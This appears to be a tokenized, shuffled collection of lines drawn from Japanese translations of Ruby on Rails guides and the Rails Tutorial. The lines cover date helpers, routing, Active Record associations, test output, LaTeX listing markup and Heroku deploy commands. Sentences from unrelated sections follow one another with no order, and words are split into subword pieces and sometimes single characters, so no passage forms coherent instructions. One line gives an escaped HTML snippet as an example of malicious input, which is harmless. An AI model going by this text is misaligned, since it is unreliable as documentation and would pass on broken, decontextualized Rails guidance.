▁デフォルトは `: utc ` です 。
▁Bootstrap フレームワーク では 、 動的な スタイルシート を生成する ために \ href { http :// less css ▖ org /}{ LESS ▁CSS } 言語 を使用しています が 、 Rails の Asset ▁Pipeline はデフォルトで は ▁( LESS と 非常に よく 似 た ) ▁Sass 言語 を サポート します ▁(\ ref { sec : sass _ and _ the _ asset _ pipeline })▟ そのため 、\ text tt { bootstrap - sass } は 、 LESS を Sass へ 変換 し 、 必要な Bootstrap ファイルを 現在の アプリケーションで すべて 利用 できるようにします
▁Rails を さらに 深 く 学ぶ のであれば 「\ href { https :// p ra g prog ▖ com / book / rails 4/ a g ile - web - development - with - rails - 4 } { A g ile ▁Web ▁Development ▁with ▁Rails } 」( Sam ▁Ruby ▁ / ▁ Dave ▁ Thomas ▁ / ▁ David ▁H einemeier ▁Hansson 著 ) 、 「\ href { http :// www ▖ a mazon ▖ com / Rails - Edit ion - Addi s on - We s le y - P rofessional - Seri es / d p /0321 9 44 27 5 }{\ emph { The ▁Rails ▁4 ▁Way }}」( O b i e ▁F er n and e z ▁ / ▁Ke v in ▁F a us t in o 著 ) 、 「\ href { http :// www ▖ a mazon ▖ com / Rails - 4 - Action - Ryan - B ig g / d p / 16 17 2 9 10 99 }{\ emph { Rails ▁4 ▁in ▁Action } }」 ▁( Ryan ▁B ig g ▁ / ▁ Y e h u d a ▁ K at z 著 ) がお勧めです ▟ ╼ ╼[ RAILS GUI D E S _ J P ]
▁Date ▖ new (201 0, ▁1, ▁31)▖ change ( month : ▁2 )
▁ここでは モデル 属性 の 扱 い に 特 化 した もの について説明します ▟ モデル 属性 に 特 化 していない 一般的な フォーム ヘルパー については 、 ActionView :: Helpers :: FormTagHelper の ドキュメント を参照してください 。
▁1 ▁ row ▁in ▁set ▁(0▖00 ▁ sec )
▁ チュートリアル の各 章 の最後 には 演習 問題 を 配置 しました ▟ 必 須 ではありません が 、 挑 戦 を お す す め します 。
▁ / photos / make
▁ ページネーション のテスト 。
▁( 開発 サーバー の ログ ・ ファイルに 出力 された SQL 文 を調べる ことで 、 この ことを確認 できます ) 。
▁ 一方で 、 User モデル に対する テストを書く のは 簡 単 かつ 今 すぐ できます ▟ その テスト の中で 、 これらの メソッドを使って い きます ▟ 具体的には 、\ k ode { following ?} メソッド である ユーザーを まだ フォロー していない ことを確認 、\ k ode { follow } メソッドを使って そのユーザー を フォロー 、 ▁\ k ode { following ?} メソッドを使って フォロー 中 になった ことを確認 、 ▁最後に \ k ode { unfollow } メソッドで フォロー解除 できた ことを確認 、 といった 具 合 で テストを して きます 。
▁ これはリスト \ ref { code : generalized _ authenticated _ p } で使用されていました 。
▁* ▁` config ▖ active _ record ▖ lock _ optimistic ally ` は 、 Active ▁Record で 楽 観的ロック ( optimistic ▁ lock ing ) を使用する かどうかを指定します ▟ デフォルト は true ( 使用する ) です 。
▁# ▁ 現在の 月 を デフォルト値 に 持つ セレクト ボックス を生成する
▁#### # ▁` advance `
▁ 記憶ダイジェスト は ユーザーが 直接 読み 出 す ことは ないので ▁( かつ 、 そう させ て はならない ので ) 、\ k ode { remember \_ digest } カラム に インデックス を追加する 必要はありません ▟ 従って 、 上の マイグレーション は 変更 せずに そのまま 使用します 。
▁* ▁ 定数 、 特に クラス名 および モジュール 名
▁ エラーメッセージ の表示 方法は アプリケーション ごとに 異なる ため 、 Rails では これらの メッセージ を直接 生成する ビュー ヘルパーは 含 まれ て いません 。
▁` offset ` メソッドは 、 関連付け を使用して オブジェクト を取得する 際の 開 始 オフ セット を指定します 。
▁# ▁# ▁=> ▁< img ▁ alt =" I con " ▁src ="/ assets / icon ▖ png " ▁/>
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁6 ▁assertions , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁\ k ode { relationships } テーブル を作成する ために 、 いつものように データベースの マイグレーション を 行 な って テスト データベース を 準備 しましょう 。
▁end _ of _ hour
▁ 今後 は URL プレフィックス の 上書き を 回 避 するために ` default _ url _ options [: script _ name ]` を設定する 必要はありません 。
▁ 安全 でない 引数 は 追加 時に エスケープ されます 。
▁ ソース の ファイル名 に 拡張子 ` ▖ js ` がない場合 は自動的に 補 われます 。
▁{0} リスト 2 ▖2{/0} ▁╼╼{1} Rails ルート で使用する Users リソース 用の ルール {2} {/2} ▁ {3} config / routes ▖ rb {/3} {/1}
▁( この時点では 、 関連付けられた マイクロポストの 破 棄 を実装 していない ので 、 上のコード は 動作 しません ▟ 原 理 を 説明 する ため だけ に 書 い ています ▟)
▁### ▁` errors [: base ]`
▁続いて この 変更を コミット し 、 Heroku に プッシュ します 。
▁ サポート されている フォーマット は 電 話 番号 、 通 貨 、 パ ー セ ン ト 、 精 度 、 座 標 、 ファイル サイズ など です 。
▁ footer 用の パーシャル
▁リスト \ ref { code : create _ destroy _ micropost _ tests } の テストにパス するためには 、 少し アプリケーション 側 の コードを リファクタリング しておく必要があります 。
▁`: start _ year ` キー と `: end _ year ` キーを ` options ` に設定する ことで 、 デフォルトの 5 年 を変更 できます 。
▁\ k ode { rake ▁test : prepare } を実行して テスト 環境 用 データベース を用意し たので 、 テストはパスするはずです 。
▁# ▁ すべての ユーザーの コレクション を返す
▁ { p 0} で 少し 触れ た {2} errors ▖ full _ messages {/2} オブジェクトは 、 ▁ エラーメッセージ の配列 を 持 っています 。
▁ チュートリアル 本 編 では この ファイル を修正する ことはありません が 、\ ref { sec : advance d _ testing _ setup } に \ k ode { ▖ gitignore } ファイル への 追加 例 があります ▟ これは 、\ ref { sec : advance d _ testing _ setup } で 行う オプション の詳細 テスト 設定 の一部 です 。
▁{0} 図 1 � 1 ▖ 4 {/0} ▁{1} マイクロポスト が表示され た プロフィール ページのモックアップ {/1}
▁has _ many ▁: count r ies
▁ //= ▁require ▁sub / something
▁<%= ▁button _ to ▁" A n ▁article ", ▁@ article , ▁remote : ▁true ▁%>
▁config ▖ middleware ▖ delete ▁" ActionDispatch :: Flash "
▁\ emph { 期待どおり } の 条件 となります ▟ そして 条件 が 満 た される と リスト { p 1 } の {3} password _ reset _ expired ? {/3} メソッドが 実行されます
▁ 新規 作成された Rails アプリケーションの ディレクトリ 構造
▁#### ▁` stylesheet _ link _ tag ` を使用して CSS ファイル にリンクする
▁self を省略した 結果を リスト \ ref { code : test _ bcrypt _ cost _ factor } に示します 。
▁このコードは リスト \ ref { code : hello _ action } で使用されていました ▟ もうひとつ 、
▁このとき 、 URL が \ text tt { https :// } に 変 わ って いて 、 アドレス バー に 鍵 アイコン が表示されている ことにも注目してください ▁( 図 \ ref { fig : signup _ in _ production })▟ これは 先ほど 設定 した SSL が うまく 動いている ことを示しています 。
▁このコードは リスト \ ref { code : login _ create _ user _ instance } で使用されていました ▟ もうひとつ 、
▁| ▁** In form ation al ** ▁| ▁100 ▁| ▁: con t in ue ▁|
▁リスト \ ref { code : default _ root _ route } に示したように 、 Rails のルーティング ファイル ▁(\ k ode { config / routes ▖ rb }) ▁ には 、 ルート ルーティング の 構成 方法 が コメント 行 に 示 されています 。
▁リスト \ ref { code : email _ downcase } の 、 メールアドレスを 小文字 に変換 する コード に対するテスト を 、 リスト \ ref { code : email _ downcase _ test } に 示 されている ように 作成 してください 。
▁\ k ode { before _ create } コールバック を使用して \ k ode { remember _ token } 属性 を作成する 。
▁( 次 章で 完全な フィード を実装する ため ) ▁ 今回は { p 0} で紹介した {2} where {/2} メソッドで これを実現 します ▟ {2} Micropost {/2} モデルに 変更 を加え た 結果を 、 リスト \ ref { code : proto _ status _ feed } に示します
▁これらの 機能 が必要な場合は ` rails - observers ` ▁gem を追加 してください 。
▁Rails の関連付け ▁( association ) ▁ では 、 関連付けられた クラス に デフォルトで 対応する 名前 を 求 め る 時に このメソッド が使用されます 。
▁* ▁`: words _ connect or `: ▁3 つ 以上の 要素を 接続 する 場合 、 最後の 2 つの 間 以外 で 使われ る 接続 詞 を指定します 。
▁ アセットパイプライン の使用 方法
▁また 、 山 括 弧 \ k ode { < } は 、\ k ode { StaticPages Controller } が ▁\ k ode { Application Controller } という Rails の クラスを \ emph { 継 承 } している ことを示しています ▟ この後 も 説明します が 、 今回 作成した ページ には 、 Rails 特有の 機能 が 多数 使用 されています
▁ クエリ 文字列 は 、 キャッシュ 無効 化 が発生する 一部の CDN では 役に立 ち ません 。
▁作成した コードをリスト \ ref { code : users _ link } に示します
▁以下の 結果 を生成します 。
▁# ▁=> ▁< Client ▁id : ▁nil , ▁first _ name : ▁" N ic k ", ▁orders _ count : ▁ 0, ▁ locked : ▁true , ▁created _ at : ▁"2011- 08 - 30 ▁06:09:27" , ▁updated _ at : ▁"2011- 08 - 30 ▁06:09:27" >
▁ この時点で Heroku に アプリ を プッシュ しても よいでしょう 。
▁{0} 図 11 ▖ 3 {/0} ▁{1} User と その Micropost は \ k ode { has _ many } ▁( 1 対 多 ) ▁ の関係 性 がある {/1}
▁ 成功 した テストスイート を 流 用 して 、 今度は 少し 難 しい 、 メールアドレス の フォーマット 検証 作業 に取りかかりま しょう 。
▁この 「 隠 れ た 」 \ k ode { input } タグ は 、 関連する 情報を ページ に置き ながら 、 それら を ブラウザ 上で 非 表示 に します 。
▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010 ▁2 1 :00:00 ▁UTC ▁+00:00
▁以下の ` Application Controller ` レイアウト が あるとします 。
▁$ ▁git ▁re base ▁- i
▁それでは 、 テスト駆動開発 で いくつかの コンテンツ を Home ページに 追加 してみましょう ▟ トップレベル の 見 出 し ▁(\ k ode { < h 1> }) ▁ に ▁" \ k ode { Sample ▁App } " ▁という 語 を追加する 作業 も この 中に 含 まれ ます ▟ ▁ まず 、 静的なページ に対する 結合テスト ▁( request ▁ spec ) ▁ を生成する ところから始め ましょう 。
▁#### ▁ 複数の 関連付け の配列
▁たとえば 、 以下の 2 つの image _ tag ヘルパーは 同じ コード を返します 。
▁#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo "> ,
▁{0} 図 8 ▖2{/0} ▁{1} ログイン 失敗 時 のモックアップ {/1}
▁今度は U の 部分 、 つまり 記事 の 更新 を実装 してみましょう 。
▁3 ▁ 番目の 問題 については 、 Rails によって自動的に 対策 が 行われます ▟ 具体的には 、 ビューテンプレート で 入力 した 内容 をすべて 自動的に エスケープ します 。
▁ アカウント有効化 と パスワード 復 旧 の 最大 の 山 場 である この セクション では 、 いよいよ production ▁( 本番 ) ▁ 環境で アプリケーション から メールを送信 します 。
▁{0} 表 11 ▖ 1 {/0} ▁{1} user / micropost 関連 メソッドの まとめ {/1}
▁### ▁ ルーティング
▁\ label { fig : signup _ success _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { 登録 フォームの 完成 } ▁% ▁( fold )╼ ▁\ label { sec : the _ finished _ signup _ form }╼╼
▁ この問題 を修正する には 、\ k ode { authenticated ?} が \ k ode { false } を返す ように する必要があります 。
▁{0}{1} 第 8 章 {/1}{/0} では 、 この \ k ode { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁ エンジン を生成する には 、 プラグイン ジェネレータ を実行し 、 必要に応じて オプションを ジェネレータ に 渡します 。
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▁( Ryan ▁Bates ) : ▁ さ っ き も ▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▁ を 紹 介 しました っ け ?
▁| ` smtp _ settings ` | `: smtp ` の 配信 メソッド の詳細 設定 を行います 。
▁次の 節 でも お 見 せ します が 、 これによって 、 以下のように マイクロポスト 用の ファクトリー を 定義 できるようになります 。
▁ バリデーション を 厳 密 に し 、 オブジェクトが 無効 だった 場合に ` ActiveModel :: Strict V al id ation F a ile d ` が発生する ように することができます 。
▁ assert _ generate s ▁' / about ', ▁controller : ▁' pages ', ▁action : ▁' about '
▁ 既に アプリケーション 側 のコードは 実装 して あるので 、 このテストは ▁\ passing \ ▁ するはずです 。
▁(\ ref { sec : version _ control } で \ k ode { co } エイリアス を設定し た場合 は 、\ k ode { git ▁co ▁- b ▁modify - README } と 入力 することもできます ) 。
▁# ▁If ▁you ▁are ▁not ▁using ▁ActiveRecord , ▁you ▁can ▁remove ▁this ▁line ▖
▁ 記憶トークン ▁(\ ref { sec : remember _ me }) ▁ と アカウント有効化 トークン ▁(\ ref { sec : account _ activation }) ▁ で 設定 した パターン に従い 、 パスワードの再設定 でも 、 メール に 記載 する 仮 想 の 再設定 用 トークン と 、 ユーザーの 取得 で 使う 再設定 用 ダイジェスト を ペ ア にする ことにします 。
▁beginning _ of _ month ▁( at _ beginning _ of _ month )
▁{0} 図 1 ▖6{/0}{1} アカウント 作成 直後 の GitHub ページ ▟\ href { http :// railstutorial ▖ org / images / figures / create _ first _ repository _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁ これまで 、 リスト \ ref { code : generate _ user _ model } の User モデルの 作成 によって どのように ▁( {2}{1} リスト 6 ▖ 2 {/1}{/2} の ) ▁ マイグレーション ファイルが 作成される か を見 てきました ▟ そして 図 \ ref { fig : sqlite _ database _ browser } で この マイグレーション を 実行 した結果 を見 ました ▟\ k ode { users } テーブル を作成する ことで 、\ k ode { development ▖ sqlite 3 } という 名 の ファイル を更新し 、\ k ode { id }、\ k ode { name }、\ k ode { email }、\ k ode { created _ at }、\ k ode { updated _ at } を作成し ました 。
▁ ログインフォーム で 入力 した 情報 に 誤り が あった ときは 、 ログイン ページを もう一度 表示 して エラーメッセージ を出力します ▁( 図 \ ref { fig : login _ failure _ mockup }) 。
▁Active ▁Record で バリデーション が 行われた 後 は 、` errors ▖ messages ` インスタンス メソッドを使用すると 、 発生 した エラー にアクセス できます ▟ このメソッドは エラー の コレクション を返します 。
▁<%= ▁render ▁partial : ▁" link _ area ", ▁layout : ▁" gr a y bar " ▁%>
▁` Article # summary ` を ** オーバーライド ** する 場合 :
▁ モデル 、 ビュー 、 コントローラ 、 ヘルパー など を含む 主要な アプリケーションコード
▁このメソッド に ファイル名 を 引数として 渡す と 、 書き込み 用に オ ー プ ン された ファイル ハ ンド ル を生成します 。
▁ただし Web T V や M ac 版 IE ▁5 ▖ 5 などの 古 い ブラウザで は 、 ページ 上で の 読み込み に 失敗します 。
▁$ ▁bundle ▁exec ▁rake ▁test ╼ Abstract Controller :: Action Not F ound : ╼ The ▁action ▁' about ' ▁could ▁not ▁be ▁found ▁for ▁StaticPages Controller
▁<%= ▁form _ for ▁@ person , ▁url : ▁ { action : ▁" create "} ▁do ▁| f | ▁%>
▁ port : ▁5 87 ,
▁たとえば 、 `@ article ▖ update ( title : ▁' A ▁new ▁title ') ` を実行し た場合 、 Rails は ` title ` 属性 のみ を更新し 、 それ以外の 属性 は 変更 しません 。
▁ 「 “ de if i ed ” 」 という 単語 は 回 文 である
▁& lt ; html & gt ; & lt ; fo nt ▁ color = r ed & gt ; h e y & lt ; / fo nt & gt ; & lt ; / html & gt ; ▁[ 任意の 邪悪な 入力 が
▁ 他の ビュー へのリンク も 作成 してみましょう ▟ " New ▁Article " リンクを ` app / views / articles / index ▖ html ▖ erb ` に追加し 、` < table >` タグ の 上に 置きます 。
▁ 純 粋 な Ruby 言語 であれば 、 これらの メソッドは 何も 実行 しません 。
▁ ログイン した ユーザー 向 け の レイアウト であれば 、 ナビゲーション ツール バー を ページの トップレベル に 表示 し 、 多くの コントローラ / アクション で 共通 して 使用 できるように する でしょう 。
▁{0} 第 {1} 5 {/1} 章 {/0} から {2} 第 {1} 10 {/1} 章 {/2} に かけて 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システムを 順に 作成し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁ 例として 、 以下のような ルーティング が あるとします 。
▁100 ▖ to _ s (: percentage , ▁ precision : ▁0 )
▁### ▁` indent `
▁ この時点で 、 To y アプリケーションを \ ref { sec : deploying } のように Heroku に 展開 しても か ま いません 。
▁ただし 文字列 と 違 って 、 全て の 文字 が 使える わけで は ない ことに注意してください
▁リスト \ ref { code : hello _ action } のコード と リスト \ ref { code : hello _ root _ route } のコード を使用すると 、 ルート ルーティング から 「 hello , ▁world !」 が 返される ようになります 。
▁ でき れば 、` ▖ t ra v is ▖ yml ` に記載されている バージョンの Ruby を使用して バックポート を ローカル で テスト してから プルリクエスト を 送信 するようにしてください 。
▁ これはリスト \ ref { code : real _ user _ fixture } で使用されていました 。
▁ セキュリティ 上 の観点 から 、 レスポンス の body に マークアップ を含め ない場合 には ` render ▁: plain ` を使用 すべき です ▟ これによって 多くの ブラウザ が 安全 でない コンテンツ を エスケープ できる からです 。
▁alias _ method ▁: process _ with out _ stringified _ params , ▁: process
▁ そして 、 アプリケーション 側 のコードは 実装 済み なので 、 これらの テストは \ passing するはずです 。
▁上のコード で使用されている 特殊な 文法 は 混 乱 し やすい ので 注意してください ▟ 普通 の プログラミング言語 では 、 定義 する メソッド の名前 に 等 号 を使用する ことはできません が 、 Ruby では メソッド名 末 尾 の 等 号 には 特殊な 意味 があり 、 上のコード は \ k ode { current _ user } への 要素 代入 を扱う ように 設計 された \ k ode { current _ user = } という メソッドを 単 に 定義 します 。
▁` has _ one ` 関連付け は 他の モデルと 1 対 1 対応 します 。
▁このメソッド を使うと 今 まで の
▁` option ` タグ の 文字列 を返します ▟ 後 述 の ` options _ from _ collection _ for _ select ` と似ています が 、 引数 の オブジェクト リレーション に基いて ` optgroup ` タグ を使用する 点 が異なります 。
▁ category ▁= ▁ Category ▖ first
▁ 新しい オブジェクトを 検索 または ビルド する
▁Rails 全体 を 高度な レベルで 概 観 できた
▁ ex - b 4 b b b 0 ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁sample _ following _ data ▁( end )╼╼ ▁\ subsection { 統 計 と フォロー 用 フォーム } ▁% ▁( fold )╼ ▁\ label { sec : stats _ and _ a _ follow _ form }╼╼
▁$ ▁rails ▁server ▁-- environment ▁production
▁ この問題 を修正する には 、\ k ode { c lang } フラグ を追加して RVM を再 インストール します 。
▁リスト \ ref { code : will _ paginate _ index _ view } のユーザー 一覧 画面 のコード と 比 較 すると 、 少し 違 っています ▟ ▟ 以前 は 次のように 単純な コード でした 。
▁ スタイル を追加した 結果を 図 \ ref { fig : site _ with _ footer } に示します 。
▁# ▁Call s ▁+ to _ param + ▁on ▁all ▁its ▁elements ▁and ▁ joins ▁the ▁result ▁with
▁ ユーザー一覧ページ の 完全な リファクタリング
▁### ▁ ブランチ を更新する
▁たとえば 、` stringify _ keys ` と ` symbolize _ keys ` では 、 キー の 変換 に ` transform _ keys ` を使用しています 。
▁\ k ode { from _ users _ followed _ by } の最初の 実装 。
▁ フォームの 更新 が終わった ので 、 今度は これ に対応する Relationship s コントローラ を 改造 して 、 Ajax リクエスト に 応答 できるように しましょう 。
▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # Request _ methods } { クライアント } ▁( 通常 、 Firefox や Safari などの Web ブラウザ ) ▁ と \ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # Request _ methods } { サーバー } ▁( Apache や N g in x などの Web サーバー ) ▁ は 、 上で 述 べ た 4 つの 基本 操作を 互 い に 認 識 できる ようになっています
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁push ╼ $ ▁git ▁push ▁ heroku ╼ $ ▁ heroku ▁run ▁rake ▁db : migrate
▁ クラス や モジュール に対して `: no doc : ` を 指定した 場合 、 その 中の すべての メソッドは 内部 API であり 、 直接 アクセス することは 許 されない ことが 示 されます 。
▁ 先ほど と同様に \ k ode { static _ pages _ controller ▖ rb } という コントローラ が生成されます 。
▁name ▁= ▁name ▖ camelize ▁if ▁ camelize ?
▁Rails アプリケーションで メールを 受 信 できるように するためには 、 以下の 作業 が必要 になります 。
▁form _ for のような 特定の モデルオブジェクト の 外 側 に スコープ を作成します が 、 フォーム タグ 自体 は 作成 しません 。
▁ ローカル の Rails サーバー では console のデフォルトの 環境 として \ text tt { development } が使用されます が 、 以下のように 他の 環境で console を実行する こともできます 。
▁ paintIt ▁= ▁( e le ment , ▁ backgroundColor , ▁textColor ) ▁->
▁( リスト \ ref { code : log _ in _ password _ resets } と 図 \ ref { fig : forgot _ password _ link } 参 照 )
▁Web アプリケーション を作成するとき に 、 ユーザー インターフェイス の概要 を できる だけ 早い うちに 把 握 しておくこと が し ば し ば 有用です 。
▁* = ▁require _ self
▁Rails とは 、 Ruby プログラミング言語 の 上で 動作する Web アプリケーション フレームワーク です 。
▁1 000 ▖ to _ s (: percentage , ▁ delimiter : ▁' ▖ ', ▁ separator : ▁ ', ')
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁+0000
▁HTTP リクエスト
▁ ブラウザから の リクエスト で ` / photos / show /1 ? user _ id = 2 ` という パス が渡され ると 、` Photos ` コントローラの ` show ` アクション に割り当てられ ます 。
▁( このとき 、 リスト { p 0} と同様に {2} if ▁@ user ▖ microposts ▖ any ? {/2} を使って 、 ユーザーのマイクロポスト が 1 つ も ない場合 には 空の リスト を 表示 させ ていない 点 にも 注 目 してください ▟)
▁` since ` メソッドは 、 同様に その 秒 数 だけ 先に 進 みます 。
▁つまり 、 以下のコード の場合 、
▁`: as ` オプション に ` true ` を設定する と 、 ポリモーフィック関連付け を指定できます 。
▁$ ▁rails ▁console
▁Client ▖ unscope d ▁ {
▁ 実際には 些 細 な 違い があり 、\ k ode { p } メソッドは 画面 出力 だけで なく 返 り 値 も オブジェクト になります ▟ しかし 、\ k ode { puts } メソッド の場合は 引数に よ らず 必ず \ k ode { nil } が 返 り 値 になります 。
▁\ ref { sec : development _ environment } で 推 奨 している Cloud 9 ▁IDE を \ emph { 利用 しない } 場合は 、 Rails プロジェクト で使用する ための \ k ode { workspace } ディレクトリ を作成 しておいてください ▁( リスト ▁\ ref { code : mkdir _ rails _ projects })▟ ▁directory ▁for ▁your ▁Rails ▁ projects ▁if ▁it ▁doesn ’ t ▁already ▁exist ▁and ▁then ▁change ▁into ▁the ▁directory ▖
▁このメソッドは ` Time ▖ now ` と似ています が 、 ユーザー 定義 の タイムゾーン がある場合 に それを 考 慮 する 点 が異なります 。
▁ ジョブ を作成する
▁action : ▁' greeting ') ▁%>
▁`: json ` オプション が指定されてい れば 、` render ` によって ` to _ json ` が自動的に 呼び出される ようになっています 。
▁たとえば 、 機能 テストの ときには パラメータ が ▁( 実際の リクエスト のときと同様に ) ▁ 文字列 で あって 欲 しい とします ▟ しかし 必要な ときには 整 数 など 他の 型の 値 を持つ ことも できるように しておきたい とします 。
▁ 通常の ERB ビュー を使用してください 。
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁User ▖ update _ all ▁" max _ login _ attempt s ▁= ▁3 , ▁must _ change _ password ▁= ▁' true ' "
▁この 設定 は ` config ▖ action _ dispatch ▖ ip _ s po of ing _ check ` オプション と ` config ▖ action _ dispatch ▖ tr us ted _ p r o x ies ` オプションで 変更 可能です 。
▁変更の結果 を リスト \ ref { code : jquery _ file _ test } に示します 。
▁ ユーザープロファイルページ の 最終的な 目標は 、 図 \ ref { fig : profile _ mockup } のように { p 2 } ユーザーの プロファイル 写 真 と 基本 ユーザー データ 、 そして マイクロポスト の一覧を表示 することです 。
▁cookies の 値が ユーザーの 記憶トークン と 一致する ことを確認 でき れば 理想 的な のですが 、 現在の 設計 では テストで この 確 認 を行う ことはできません ▟ コントローラ内の \ k ode { user } 変数 には 記憶トークン の 属性 が含まれています が 、\ k ode { remember \_ token } は 実 在 しない 「 仮 想 」 の もの なので 、\ k ode {@ user } インスタンス変数 の方 には 含 まれ て いません 。
▁ ガ イ ダ ン ス については [ アセットを プリコンパイル する ](# アセットを プリコンパイル する ) を参照してください 。
▁` attr _ internal ` マクロ は ` attr _ internal _ accessor ` と 同 義 です 。
▁このメソッドは 内部で ` image _ path ` を呼び出し ており 、 現在の ホスト または アセット 用の ホスト と マージ して URL を生成します 。
▁{0}{1} リスト 4 ▖ 1 {/1}{/0} の 以下の行 にご注目ください 。
▁ ファイル の内容 が更新され ると 、 フィンガープリント も 更新 されます 。
▁リスト \ ref { code : palindrome _ test er } のとき
▁ 返される クラス の順序 は 一 定 ではありません 。
▁\ k ode { user } に \ k ode { michael } という 値 を渡すと 、 Rails は fixture ファイル 内の 対応する ユーザー を探し 出 して 、( もし 見 つ か れば ) ▁ マイクロポスト に 関連付け て く れ ます 。
▁def ▁self ▖ published
▁次に 、 Spork の設定 に bootstrap を指定します 。
▁\ k ode { UsersController } クラスにおける継承 。
▁ Asset ▁Pipeline 互 換 の 行 を追加する 。
▁( 4 ▖ months ▁+ ▁5 ▖ years )▖ from _ now
▁ 最初は \ k ode { count } メソッドを 紹介します ▟ これは エラー の 数 を返します 。
▁この 類 の エ ンド ツ ー エ ンド テストは 、 アプリケーションの 重要な 機能 をカバー してくれ ています ▟ こういった 理由 が 統合テスト が 便 利 だ と呼ばれる 所 以 です 。
▁次に 、 フォロー 用 と フォロー解除 用の フォーム を作成します ▟ それ から 、 フォローしているユーザー の 一覧 ▁( " following ") ▁ と フォロワー の 一覧 ▁( " followers ") ▁ を表示する 専 用の ページ を作成します 。
▁class ▁ Engine ▁< ▁ :: Rails :: Engine
▁Spork ▁is ▁ready ▁and ▁list en ing ▁on ▁ 89 89 !
▁ 楽 観的ロック を使用する には 、 テーブルに ` lock _ version ` という名前の integer 型 カラム がある 必要があります 。
▁この バリデーション は 、 モデルの テーブル に対して 、 その 属性 と同じ 値 を持つ 既存の レコード がある かどうか を調べる SQL クエリ を実行する ことによって 行われます 。
▁{0}{1} 第 8 章 {/1}{/0} では 、\ ref { sec : adding _ a _ secure _ password } の 認証システム を利用して 、 ユーザーが 実際に Web サイトに ログイン できるようにします 。
▁false に設定する と 、 Customer クラス が 使用する テーブル名 は 単数形 の ` customer ` になります 。
▁上のコードでは 、 よく 使われ る 以下のような 構造 が使用されています が 、 少し 紛 ら わ しい 点 があります 。
▁</ ul >
▁次に 、 Bitbucket で ▁[ Create ] ▁ ボタン をクリックして \ href { https :// bitbucket ▖ org / repo / create } { 新しい リポジトリを 作成 } します ( 図 ▁\ ref { fig : create _ demo _ repository })▟ 続いて 、 生成 した ファイルを この 新しい リモート リポジトリ に プッシュ します 。
▁@ assembly ▁= ▁@ part ▖ assemblies ▖ build ( { assembly _ name : ▁" Trans mis s ion ▁h ous ing " })
▁<%= ▁image _ tag ▁" icon s / delete ▖ g if ", ▁ { height : ▁ 45 } ▁%>
▁ エ ン ジ ニ ア リ ング 記 法 も 従来 通り サポート されます 。
▁ 有効な ユーザー だけ を表示する コードの テンプレート
▁< http :// localhost :3000/ articles / new > を ブラウザで 再 表示する と 、 ページに タイトル が表示される ようになりました 。
▁ただし 、` inverse _ of ` の サポート には いくつかの 制限 があります 。
▁following
▁Ajax を使った フォロー フォーム
▁orders ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁\ href { http :// rvm ▖ io / rvm / install /}{ RVM をインストール } して あれば 、 既に RubyGems も 同時に インストール されている はずです 。
▁Rails で Ajax を使用する という テーマ は 奥 が 深 く 、 かつ 進 歩 が 早い ので 、 本書 では ほんの 表 面 を な ぞ った に過ぎません ▟ しかし 、 本書 の 他の 題 材 と同様 、 今後 より 高度な 資 料 に あ た る 際に 必要な 基 礎 となる はずです 。
▁# ▁ 認 証 トークン を remote フォーム に 埋 め 込 む
▁ 検索 キー
▁* ▁Rails アプリケーションの 動作を 調 整 する方法
▁ マイグレーション を コピー する 必要のある エンジン がいくつも ある 場合は 、 代りに ` railties : install : migrations ` を使用します 。
▁ ファイルの コピー が CDN に ない場合 、 CDN は ▁" origin " ▁( この場合 ` example ▖ com / assets / s m ile ▖ png ` ) ▁ を探し て 今後 のために 保存 しておきます 。
▁real 	 0 m 8 ▖ 6 3 3 s
▁この カラム は 、[ Active ▁Record マイグレーション ]( migrations ▖ html ) を使用して テーブル を作成するとき に 自動的に 作成されます 。
▁validates ▁ FILL _ IN , ▁presence : ▁true ▁# ▁Re p la ce ▁ FILL _ IN ▁with ▁the ▁right ▁code ▖╼ ▁validates ▁ FILL _ IN , ▁presence : ▁true ▁# ▁Re p la ce ▁ FILL _ IN ▁with ▁the ▁right ▁code ▖╼ end ╼\ end { code }╼\ end { code listing }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / user _ presence _ validations ▖ png }╼\ end { center }╼\ caption { The ▁effect ▁of ▁presence ▁validations ▁on ▁the ▁User ▁model ▖ \ label { fig : user _ presence _ validations } }╼\ end { figure }╼╼ ▁% ▁subsection ▁ demo _ user _ has _ many _ microposts ▁( end )╼╼ ▁\ subsection { 継 承 の 階層 } ▁% ▁( fold )╼ ▁\ label { sec : inheritance _ hierarchies }╼╼
▁( 10 ▖ 57 ▁ のコード にある \ k ode { response ▖ body } は 、 その ページの HTML 本 文 をすべて 返す メソッドです ) 。
▁ 前 回 同様 、\ k ode { will \_ paginate } メソッド を使うと 次のようになります 。
▁次に master ブランチにマージ バ ッ ク します 。
▁` app / assets / stylesheets ` に置かれている スタイルシート アセット へのパス を算出 します 。
▁\ k ode { content _ tag } を使って レイアウト の中に \ k ode { flash } を 埋 め 込 む
▁< style > <%= ▁yield ▁: stylesheets ▁%></ style >
▁self ▖ author ▁= ▁User ▖ find _ or _ create _ by ( name : ▁author _ name )
▁=> ▁" ra bo of "
▁ サイドバー で マイクロポストの 投 稿 数 をテストする ための テンプレート
▁\ ref { sec : demo _ users _ resource } でも 説明したように 、 システム 環境 によって は \ k ode { bundle ▁exec } が 追加 不要な こともあります ▟ クラウド IDE ▁(\ ref { sec : development _ environment }) ▁ も 追加 不要な システム のひとつ です ▟ しかし ここでは 省略 せずに コマンドを き じ ゅ つ しています 。
